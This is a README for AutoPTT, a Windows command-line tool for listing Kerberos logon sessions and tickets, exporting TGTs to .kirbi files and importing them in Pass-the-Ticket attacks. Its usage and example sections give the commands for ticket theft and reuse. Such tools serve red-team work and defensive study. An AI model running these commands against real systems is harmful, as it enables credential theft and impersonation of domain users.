# AutoPTT

Enumerate Kerberos sessions and tickets and perform Pass-The-Ticket (PtT) attacks interactively. It allows to:

- List logon sessions on the system like klist.

- View tickets from current session like klist.

- View tickets from all sessions like Rubeus.

- Extract TGT tickets like Rubeus or Mimikatz.

- Import tickets into current session like Rubeus or Mimikatz.

You can do this step by step or automatically using the "auto" option.

<br>

-----------------------------------------------

## Usage

```bash
# View all logon sessions
autoptt.exe sessions

# List tickets in current session
autoptt.exe klist

# Enumerate ALL tickets from ALL sessions (requires admin)
autoptt.exe tickets

# Export a TGT by LogonId
autoptt.exe export 0x79fb3

# Import a ticket file
autoptt.exe ptt 0x79fb3_Administrator.kirbi

# Interactive mode: Browse and import tickets
autoptt.exe auto
```

<br>

-----------------------------------------------

## Examples

List all logon sessions:

```bash
autoptt.exe sessions
```

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_1.png)


Show tickets in current session:

```bash
autoptt.exe klist
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_2.png)


Enumerate all tickets:

```bash
autoptt.exe tickets
```

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_3.png)


Export TGT to .kirbi file given LogonId (e.g., 0x79fb3):

```
autoptt.exe export <LOGON_ID>
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_4.png)


Import .kirbi ticket file:

```bash
autoptt.exe ptt <PTT_FILE>
```

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_5.png)


Interactive mode: browse and import TGTs:

```bash
autoptt.exe auto
```

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_6.png)
